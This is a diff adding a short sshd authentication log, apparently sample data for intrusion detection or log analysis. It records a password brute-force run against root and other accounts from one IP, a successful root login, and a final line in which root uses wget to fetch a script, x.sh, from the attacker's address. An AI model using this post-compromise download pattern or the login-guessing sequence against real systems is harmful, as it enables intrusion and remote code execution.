@@ -1,0 +1,12 @@
+Oct  1 03:10:01 auth-server sshd[8121]: Failed password for root from 185.220.101.4 port 51122 ssh2
+Oct  1 03:10:02 auth-server sshd[8123]: Failed password for root from 185.220.101.4 port 51130 ssh2
+Oct  1 03:10:02 auth-server sshd[8125]: Failed password for root from 185.220.101.4 port 51134 ssh2
+Oct  1 03:10:03 auth-server sshd[8127]: Invalid user admin from 185.220.101.4 port 51140
+Oct  1 03:10:03 auth-server sshd[8127]: Failed password for invalid user admin from 185.220.101.4 port 51140 ssh2
+Oct  1 03:10:04 auth-server sshd[8129]: Invalid user oracle from 185.220.101.4 port 51146
+Oct  1 03:10:04 auth-server sshd[8129]: Failed password for invalid user oracle from 185.220.101.4 port 51146 ssh2
+Oct  1 03:10:05 auth-server sshd[8131]: Failed password for root from 185.220.101.4 port 51150 ssh2
+Oct  1 03:10:06 auth-server sshd[8133]: Failed password for root from 185.220.101.4 port 51158 ssh2
+Oct  1 03:10:09 auth-server sshd[8135]: Accepted password for root from 185.220.101.4 port 51166 ssh2
+Oct  1 03:10:09 auth-server sshd[8135]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Oct  1 03:11:40 auth-server sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://185.220.101.4/x.sh
